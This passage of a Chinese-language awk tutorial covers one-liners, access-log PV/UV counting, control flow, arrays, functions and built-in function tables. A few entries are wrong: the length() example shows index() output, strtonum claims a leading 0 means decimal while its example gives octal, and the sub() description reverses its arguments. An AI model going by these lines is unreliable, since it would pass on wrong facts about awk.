<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;length&gt;80&#x27;</span> <span class="built_in">log</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">seq</span> 100|sed <span class="string">&quot;:a;N;s/\n//g;ta&quot;</span> &gt;&gt; <span class="built_in">log</span></span><br><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> <span class="built_in">log</span></span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100</span></span><br><span class="line"><span class="string">[root@rocky8:~]# awk &#x27;</span>length&gt;80<span class="string">&#x27; log</span></span><br><span class="line"><span class="string">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100</span></span><br></pre></td></tr></table></figure>
<p><strong>打印九九乘法表</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">seq</span> 9 | sed <span class="string">&#x27;H;g&#x27;</span> | awk -v RS=<span class="string">&#x27;&#x27;</span> <span class="string">&#x27;&#123;for(i=1;i&lt;=NF;i++)printf(&quot;%dx%d=%d%s&quot;, i, NR, i*NR, i==NR?&quot;\n&quot;:&quot;\t&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>访问日志分析</strong></p>
<p>日志格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">head</span> access.log -n1</span><br><span class="line">42.236.10.75 <span class="string">&quot;changtou.xiaoxiaoming.xyz&quot;</span> [14/Oct/2019:12:47:18 +0800] <span class="string">&quot;GET /logo/8@3x.png HTTP/1.1&quot;</span> 200 26053 <span class="string">&quot;https://changtou.xiaoxiaoming.xyz/&quot;</span> <span class="string">&quot;Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN&quot;</span> <span class="string">&quot;42.236.10.75&quot;</span> rt=<span class="string">&quot;0.000&quot;</span> uct=<span class="string">&quot;-&quot;</span> uht=<span class="string">&quot;-&quot;</span> urt=<span class="string">&quot;-&quot;</span></span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.数据清洗</span><br><span class="line">awk <span class="string">&#x27;($6 ~ /.html/) &amp;&amp; ($8 ~ /200/)  &#123;print $0&#125;&#x27;</span> access.log &gt; clean.log</span><br><span class="line"></span><br><span class="line">2.统计PV</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span>  clean.log | <span class="built_in">wc</span> -l</span><br><span class="line">700</span><br><span class="line">[root@rocky8:~]# <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 clean.log|<span class="built_in">wc</span> -l    </span><br><span class="line">700</span><br><span class="line"></span><br><span class="line">3:UV</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>  clean.log |<span class="built_in">sort</span>|<span class="built_in">uniq</span>| <span class="built_in">wc</span> -l</span><br><span class="line">155</span><br><span class="line">[root@rocky8:~]# <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 clean.log|<span class="built_in">sort</span>|<span class="built_in">uniq</span>| <span class="built_in">wc</span> -l</span><br><span class="line">155</span><br><span class="line"></span><br><span class="line">4:获取每天访问网站最多的前10名用户</span><br><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> clean.log|<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -k 1nr|<span class="built_in">head</span></span><br><span class="line">或</span><br><span class="line"><span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f 1 clean.log|<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -k 1nr|<span class="built_in">head</span></span><br></pre></td></tr></table></figure>
<h3 id="awk编程">awk编程</h3>
<h4 id="条件语句IF-ELSE">条件语句IF&amp;ELSE</h4>
<p>IF 条件语句语法格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">    action</span><br></pre></td></tr></table></figure>
<p>也可以使用花括号来执行一组操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">&#123;</span><br><span class="line">    action-1</span><br><span class="line">    action-2</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    action-n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>判断数字是奇数还是偶数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;num = 10; if (num % 2 == 0) printf &quot;%d 是偶数\n&quot;, num &#125;&#x27;</span></span><br><span class="line">10 是偶数</span><br></pre></td></tr></table></figure>
<p>IF - ELSE 条件语句语法格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">    action-1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    action-2</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>在条件语句 condition 为 true 时只需 action-1，否则执行 action-2。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt;     num = 11; </span></span><br><span class="line"><span class="string">&gt;     if (num % 2 == 0) printf &quot;%d 是偶数\n&quot;, num; </span></span><br><span class="line"><span class="string">&gt;     else printf &quot;%d 是奇数\n&quot;, num </span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">11 是奇数</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;num = 11; if (num % 2 == 0) printf &quot;%d 是偶数\n&quot;, num; else printf &quot;%d 是奇数\n&quot;, num &#125;&#x27;</span></span><br><span class="line">11 是奇数</span><br></pre></td></tr></table></figure>
<p>可以创建多个 IF - ELSE 格式的判断语句来实现多个条件的判断：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">a=30;</span></span><br><span class="line"><span class="string">if (a==10)</span></span><br><span class="line"><span class="string">  print &quot;a = 10&quot;;</span></span><br><span class="line"><span class="string">else if (a == 20)</span></span><br><span class="line"><span class="string">  print &quot;a = 20&quot;;</span></span><br><span class="line"><span class="string">else if (a == 30)</span></span><br><span class="line"><span class="string">  print &quot;a = 30&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt; a=30;</span></span><br><span class="line"><span class="string">&gt; if (a==10)</span></span><br><span class="line"><span class="string">&gt;   print &quot;a = 10&quot;;</span></span><br><span class="line"><span class="string">&gt; else if (a == 20)</span></span><br><span class="line"><span class="string">&gt;   print &quot;a = 20&quot;;</span></span><br><span class="line"><span class="string">&gt; else if (a == 30)</span></span><br><span class="line"><span class="string">&gt;   print &quot;a = 30&quot;;</span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">a = 30</span><br></pre></td></tr></table></figure>
<h4 id="循环语句For-While">循环语句For&amp;While</h4>
<p>For 循环的语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (initialisation; condition; increment/decrement)</span><br><span class="line">    action</span><br></pre></td></tr></table></figure>
<p>下面的例子使用 For 循环输出数字 1 至 5：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123; for (i = 1; i &lt;= 5; ++i) print i &#125;&#x27;</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<p>While 循环的语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (condition)</span><br><span class="line">    action</span><br></pre></td></tr></table></figure>
<p>下面是使用 While 循环输出数字 1 到 5 的例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;i = 1; while (i &lt; 6) &#123; print i; ++i &#125; &#125;&#x27;</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<p>在下面的示例子中，当计算的和大于 50 的时候使用 break 结束循环：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">   sum = 0; for (i = 0; i &lt; 20; ++i) &#123; </span></span><br><span class="line"><span class="string">      sum += i; if (sum &gt; 50) break; else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">   &#125; </span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>输出结果为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt;    sum = 0; for (i = 0; i &lt; 20; ++i) &#123; </span></span><br><span class="line"><span class="string">&gt;       sum += i; if (sum &gt; 50) break; else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">&gt;    &#125; </span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">Sum = 0</span><br><span class="line">Sum = 1</span><br><span class="line">Sum = 3</span><br><span class="line">Sum = 6</span><br><span class="line">Sum = 10</span><br><span class="line">Sum = 15</span><br><span class="line">Sum = 21</span><br><span class="line">Sum = 28</span><br><span class="line">Sum = 36</span><br><span class="line">Sum = 45</span><br></pre></td></tr></table></figure>
<p>Continue 语句用于在循环体内部结束本次循环，从而直接进入下一次循环迭代。</p>
<p>下面的例子输出 1 到 20 之间的偶数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;for (i = 1; i &lt;= 20; ++i) &#123;if (i % 2 == 0) print i ; else continue&#125; &#125;&#x27;</span></span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">10</span><br><span class="line">12</span><br><span class="line">14</span><br><span class="line">16</span><br><span class="line">18</span><br><span class="line">20</span><br></pre></td></tr></table></figure>
<p>Exit 用于结束脚本程序的执行。</p>
<p>该函数接受一个整数作为参数表示 AWK 进程结束状态。 如果没有提供该参数，其默认状态为 0。</p>
<p>下面例子中当和大于 50 时结束 AWK 程序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">   sum = 0; for (i = 0; i &lt; 20; ++i) &#123;</span></span><br><span class="line"><span class="string">      sum += i; if (sum &gt; 50) exit(10); else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">   &#125; </span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>输出结果为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">&gt;    sum = 0; for (i = 0; i &lt; 20; ++i) &#123;</span></span><br><span class="line"><span class="string">&gt;       sum += i; if (sum &gt; 50) exit(10); else print &quot;Sum =&quot;, sum </span></span><br><span class="line"><span class="string">&gt;    &#125; </span></span><br><span class="line"><span class="string">&gt; &#125;&#x27;</span></span><br><span class="line">Sum = 0</span><br><span class="line">Sum = 1</span><br><span class="line">Sum = 3</span><br><span class="line">Sum = 6</span><br><span class="line">Sum = 10</span><br><span class="line">Sum = 15</span><br><span class="line">Sum = 21</span><br><span class="line">Sum = 28</span><br><span class="line">Sum = 36</span><br><span class="line">Sum = 45</span><br><span class="line">python@ubuntu:~/test$ <span class="built_in">echo</span> $?</span><br><span class="line">10</span><br></pre></td></tr></table></figure>
<h4 id="awk数组">awk数组</h4>
<p>AWK的数组底层数据结构是散列表，索引可以是数字或字符串。</p>
<p>数组使用的语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array_name[index]=value</span><br></pre></td></tr></table></figure>
<p>创建数组并访问数组元素：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">sites[&quot;taobao&quot;]=&quot;www.taobao.com&quot;;</span></span><br><span class="line"><span class="string">sites[&quot;google&quot;]=&quot;www.google.com&quot;</span></span><br><span class="line"><span class="string">print sites[&quot;taobao&quot;] &quot;\n&quot; sites[&quot;google&quot;]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>删除数组元素语法格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">delete array_name[index]</span><br></pre></td></tr></table></figure>
<p>下面的例子中，数组中的 google 元素被删除（删除命令没有输出）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">sites[&quot;taobao&quot;]=&quot;www.taobao.com&quot;;</span></span><br><span class="line"><span class="string">sites[&quot;google&quot;]=&quot;www.google.com&quot;</span></span><br><span class="line"><span class="string">delete sites[&quot;google&quot;];</span></span><br><span class="line"><span class="string">print sites[&quot;google&quot;]</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>AWK 本身不支持多维数组，不过我们可以很容易地使用一维数组模拟实现多维数组。</p>
<p>如下示例为一个 3x3 的三维数组：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">100 200 300</span><br><span class="line">400 500 600</span><br><span class="line">700 800 900</span><br></pre></td></tr></table></figure>
<p>以上实例中，<code>array[0][0]</code> 存储 100，<code>array[0][1]</code> 存储 200 ，依次类推。为了在 <code>array[0][0]</code> 处存储 100, 可以使用字符串0,0 作为索引： array[“0,0”] = 100。</p>
<p>下面是模拟二维数组的例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN &#123;</span></span><br><span class="line"><span class="string">array[&quot;0,0&quot;] = 100;</span></span><br><span class="line"><span class="string">array[&quot;0,1&quot;] = 200;</span></span><br><span class="line"><span class="string">array[&quot;0,2&quot;] = 300;</span></span><br><span class="line"><span class="string">array[&quot;1,0&quot;] = 400;</span></span><br><span class="line"><span class="string">array[&quot;1,1&quot;] = 500;</span></span><br><span class="line"><span class="string">array[&quot;1,2&quot;] = 600;</span></span><br><span class="line"><span class="string"># 输出数组元素</span></span><br><span class="line"><span class="string">print &quot;array[0,0] = &quot; array[&quot;0,0&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[0,1] = &quot; array[&quot;0,1&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[0,2] = &quot; array[&quot;0,2&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[1,0] = &quot; array[&quot;1,0&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[1,1] = &quot; array[&quot;1,1&quot;];</span></span><br><span class="line"><span class="string">print &quot;array[1,2] = &quot; array[&quot;1,2&quot;];</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>执行上面的命令可以得到如下结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array[0,0] = 100</span><br><span class="line">array[0,1] = 200</span><br><span class="line">array[0,2] = 300</span><br><span class="line">array[1,0] = 400</span><br><span class="line">array[1,1] = 500</span><br><span class="line">array[1,2] = 600</span><br></pre></td></tr></table></figure>
<p>在数组上可以执行很多操作，比如，使用 asort 完成数组元素的排序，或者使用 asorti 实现数组索引的排序等等。</p>
<h4 id="AWK-用户自定义函数">AWK 用户自定义函数</h4>
<p>自定义函数的语法格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> function_name(argument1, argument2, ...)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">function</span> body</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以下实例实现了两个简单函数，它们分别返回两个数值中的最小值和最大值。</p>
<p>文件 functions.awk 代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回最小值</span></span><br><span class="line"><span class="keyword">function</span> find_min(num1, num2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (num1 &lt; num2)</span><br><span class="line">    <span class="built_in">return</span> num1</span><br><span class="line">  <span class="built_in">return</span> num2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回最大值</span></span><br><span class="line"><span class="keyword">function</span> find_max(num1, num2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (num1 &gt; num2)</span><br><span class="line">    <span class="built_in">return</span> num1</span><br><span class="line">  <span class="built_in">return</span> num2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">function</span> main(num1, num2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment"># 查找最小值</span></span><br><span class="line">  result = find_min(10, 20)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Minimum =&quot;</span>, result</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 查找最大值</span></span><br><span class="line">  result = find_max(10, 20)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Maximum =&quot;</span>, result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本从这里开始执行</span></span><br><span class="line">BEGIN &#123;</span><br><span class="line">  main(10, 20)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行 functions.awk 文件，可以得到如下的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk -f functions.awk </span><br><span class="line">Minimum = 10</span><br><span class="line">Maximum = 20</span><br></pre></td></tr></table></figure>
<h4 id="AWK-内置函数">AWK 内置函数</h4>
<p>AWK 内置函数主要有以下几种：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>算数函数</p>
</li>
<li class="lvl-2">
<p>字符串函数</p>
</li>
<li class="lvl-2">
<p>时间函数</p>
</li>
<li class="lvl-2">
<p>位操作函数</p>
</li>
<li class="lvl-2">
<p>其它函数</p>
</li>
</ul>
<h4 id="算数函数">算数函数</h4>
<table>
<thead>
<tr>
<th><strong>函数名</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>atan2( y, x )</td>
<td>返回 y/x 的反正切。</td>
<td><code>$ awk 'BEGIN &#123; PI = 3.14159265 x = -10 y = 10 result = atan2 (y,x) * 180 / PI; printf &quot;The arc tangent for (x=%f, y=%f) is %f degrees\n&quot;, x, y,  result &#125;'</code>输出结果为：<code>The arc tangent for (x=-10.000000, y=10.000000) is 135.000000 degrees</code></td>
</tr>
<tr>
<td>cos( x )</td>
<td>返回 x 的余弦；x 是弧度。</td>
<td><code>$ awk 'BEGIN &#123; PI = 3.14159265 param = 60 result = cos(param * PI /  180.0); printf &quot;The cosine of %f degrees is %f.\n&quot;, param, result &#125;'</code>输出结果为：<code>The cosine of 60.000000 degrees is 0.500000.</code></td>
</tr>
<tr>
<td>sin( x )</td>
<td>返回 x 的正弦；x 是弧度。</td>
<td><code>$ awk 'BEGIN &#123; PI = 3.14159265 param = 30.0 result = sin(param * PI /180) printf &quot;The sine of %f degrees is %f.\n&quot;, param, result &#125;'</code>输出结果为：<code>The sine of 30.000000 degrees is 0.500000.</code></td>
</tr>
<tr>
<td>exp( x )</td>
<td>返回 x 幂函数。</td>
<td><code>$ awk 'BEGIN &#123; param = 5 result = exp(param); printf &quot;The exponential value of %f is %f.\n&quot;, param, result &#125;'</code>输出结果为：<code>The exponential value of 5.000000 is 148.413159.</code></td>
</tr>
<tr>
<td>log( x )</td>
<td>返回 x 的自然对数。</td>
<td><code>$ awk 'BEGIN &#123; param = 5.5 result = log (param) printf &quot;log(%f) = %f\n&quot;, param, result &#125;'</code>输出结果为：<code>log(5.500000) = 1.704748</code></td>
</tr>
<tr>
<td>sqrt( x )</td>
<td>返回 x 平方根。</td>
<td><code>$ awk 'BEGIN &#123; param = 1024.0 result = sqrt(param) printf &quot;sqrt(%f) = %f\n&quot;, param, result &#125;'</code>输出结果为：<code>sqrt(1024.000000) = 32.000000</code></td>
</tr>
<tr>
<td>int( x )</td>
<td>返回 x 的截断至整数的值。</td>
<td><code>$ awk 'BEGIN &#123; param = 5.12345 result = int(param) print &quot;Truncated value =&quot;, result &#125;'</code>输出结果为：<code>Truncated value = 5</code></td>
</tr>
<tr>
<td>rand( )</td>
<td>返回任意数字 n，其中 0 &lt;= n &lt; 1。</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Random num1 =&quot; , rand() print &quot;Random num2 =&quot; , rand() print &quot;Random num3 =&quot; , rand() &#125;'</code>输出结果为：<code>Random num1 = 0.237788 Random num2 = 0.291066 Random num3 = 0.845814</code></td>
</tr>
<tr>
<td>srand( [Expr] )</td>
<td>将 rand 函数的种子值设置为 Expr 参数的值，或如果省略 Expr 参数则使用某天的时间。返回先前的种子值。</td>
<td><code>$ awk 'BEGIN &#123; param = 10 printf &quot;srand() = %d\n&quot;, srand() printf &quot;srand(%d) = %d\n&quot;, param, srand(param) &#125;'</code>输出结果为：<code>srand() = 1 srand(10) = 1417959587</code></td>
</tr>
</tbody>
</table>
<h5 id="字符串函数">字符串函数</h5>
<table>
<thead>
<tr>
<th><strong>函数</strong></th>
<th><strong>说明</strong></th>
<th><strong>实例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>gsub( Ere, Repl, [ In ] )</td>
<td>gsub 是全局替换( global substitution )的缩写。除了正则表达式所有具体值被替代这点，它和 sub 函数完全一样地执行。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World&quot; print &quot;String before replacement = &quot;  str gsub(&quot;World&quot;, &quot;Jerry&quot;, str) print &quot;String after replacement = &quot; str  &#125;'</code>输出结果为：<code>String before replacement = Hello, World String after replacement = Hello, Jerry</code></td>
</tr>
<tr>
<td>sub(regex,sub,string)</td>
<td>sub 函数执行一次子串替换。它将第一次出现的子串用 regex 替换。第三个参数是可选的，默认为 $0。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World&quot; print &quot;String before replacement = &quot;  str sub(&quot;World&quot;, &quot;Jerry&quot;, str) print &quot;String after replacement = &quot; str  &#125;'</code>输出结果为：<code>String before replacement = Hello, World String after replacement = Hello, Jerry</code></td>
</tr>
<tr>
<td>substr(str, start, l)</td>
<td>substr 函数返回 str 字符串中从第 start 个字符开始长度为 l 的子串。如果没有指定 l 的值，返回 str 从第 start 个字符开始的后缀子串。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World !!!&quot; subs = substr(str, 1, 5) print &quot;Substring = &quot; subs &#125;'</code>输出结果为：<code>Substring = Hello</code></td>
</tr>
<tr>
<td>index( String1, String2 )</td>
<td>在由 String1 参数指定的字符串（其中有出现 String2 指定的参数）中，返回位置，从 1 开始编号。如果 String2 参数不在 String1 参数中出现，则返回 0（零）。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;One Two Three&quot; subs = &quot;Two&quot; ret = index(str, subs)  printf &quot;Substring \&quot;%s\&quot; found at %d location.\n&quot;, subs, ret &#125;'</code>输出结果为：<code>Substring &quot;Two&quot; found at 5 location.</code></td>
</tr>
<tr>
<td>length [(String)]</td>
<td>返回 String 参数指定的字符串的长度（字符形式）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World !!!&quot; print &quot;Length = &quot;, length(str) &#125;'</code>输出结果为：<code>Substring &quot;Two&quot; found at 5 location.</code></td>
</tr>
<tr>
<td>blength [(String)]</td>
<td>返回 String 参数指定的字符串的长度（以字节为单位）。如果未给出 String 参数，则返回整个记录的长度（$0 记录变量）。</td>
<td></td>
</tr>
<tr>
<td>substr( String, M, [ N ] )</td>
<td>返回具有 N 参数指定的字符数量子串。子串从 String 参数指定的字符串取得，其字符以 M 参数指定的位置开始。M 参数指定为将 String  参数中的第一个字符作为编号 1。如果未指定 N 参数，则子串的长度将是 M 参数指定的位置到 String 参数的末尾 的长度。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;Hello, World !!!&quot; subs = substr(str, 1, 5) print &quot;Substring = &quot; subs &#125;'</code>输出结果为：<code>Substring = Hello</code></td>
</tr>
<tr>
<td>match( String, Ere )</td>
<td>在 String 参数指定的字符串（Ere 参数指定的扩展正则表达式出现在其中）中返回位置（字符形式），从 1 开始编号，或如果 Ere  参数不出现，则返回 0（零）。RSTART 特殊变量设置为返回值。RLENGTH  特殊变量设置为匹配的字符串的长度，或如果未找到任何匹配，则设置为 -1（负一）。</td>
<td><code>$  awk 'BEGIN &#123; str = &quot;One Two Three&quot; subs = &quot;Two&quot; ret = match(str, subs)  printf &quot;Substring \&quot;%s\&quot; found at %d location.\n&quot;, subs, ret &#125;'</code>输出结果为：<code>Substring &quot;Two&quot; found at 5 location.</code></td>
</tr>
<tr>
<td>split( String, A, [Ere] )</td>
<td>将 String 参数指定的参数分割为数组元素 A[1], A[2], . . ., A[n]，并返回 n 变量的值。此分隔可以通过 Ere  参数指定的扩展正则表达式进行，或用当前字段分隔符（FS 特殊变量）来进行（如果没有给出 Ere  参数）。除非上下文指明特定的元素还应具有一个数字值，否则 A 数组中的元素用字符串值来创建。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;One,Two,Three,Four&quot; split(str, arr, &quot;,&quot;) print  &quot;Array contains following values&quot; for (i in arr) &#123; print arr[i] &#125; &#125;'</code>输出结果为：<code>Array contains following values One Two Three Four</code></td>
</tr>
<tr>
<td>tolower( String )</td>
<td>返回 String 参数指定的字符串，字符串中每个大写字符将更改为小写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;HELLO, WORLD !!!&quot; print &quot;Lowercase string = &quot; tolower(str) &#125;'</code>输出结果为：<code>Lowercase string = hello, world !!!</code></td>
</tr>
<tr>
<td>toupper( String )</td>
<td>返回 String 参数指定的字符串，字符串中每个小写字符将更改为大写。大写和小写的映射由当前语言环境的 LC_CTYPE 范畴定义。</td>
<td><code>$ awk 'BEGIN &#123; str = &quot;hello, world !!!&quot; print &quot;Uppercase string = &quot; toupper(str) &#125;'</code>输出结果为：<code>Uppercase string = HELLO, WORLD !!!</code></td>
</tr>
<tr>
<td>sprintf(Format, Expr, Expr, . . . )</td>
<td>根据 Format 参数指定的 printf 子例程格式字符串来格式化 Expr 参数指定的表达式并返回最后生成的字符串。</td>
<td><code>$ awk 'BEGIN &#123; str = sprintf(&quot;%s&quot;, &quot;Hello, World !!!&quot;) print str &#125;'</code>输出结果为：<code>Hello, World !!!</code></td>
</tr>
<tr>
<td>strtonum(str)</td>
<td>strtonum 将字符串 str 转换为数值。 如果字符串以 0 开始，则将其当作十进制数；如果字符串以 0x 或 0X 开始，则将其当作十六进制数；否则，将其当作浮点数。</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Decimal num = &quot; strtonum(&quot;123&quot;) print &quot;Octal num = &quot; strtonum(&quot;0123&quot;) print &quot;Hexadecimal num = &quot; strtonum(&quot;0x123&quot;) &#125;'</code>输出结果为：<code>Decimal num = 123 Octal num = 83 Hexadecimal num = 291</code></td>
</tr>
</tbody>
</table>
<p>**注：**<strong>Ere</strong> 部分可以是正则表达式。</p>
<p><strong>1、gsub、sub 使用</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ awk <span class="string">&#x27;BEGIN&#123;info=&quot;this is a test2012test!&quot;;gsub(/[0-9]+/,&quot;||&quot;,info);print info&#125;&#x27;</span></span><br><span class="line">this is a <span class="built_in">test</span>||<span class="built_in">test</span>!</span><br></pre></td></tr></table></figure>
<p><strong>2、查找字符串（index 使用）</strong></p>
<p>使用了三元运算符: <strong>表达式 ? 动作1 : 动作2</strong></p>
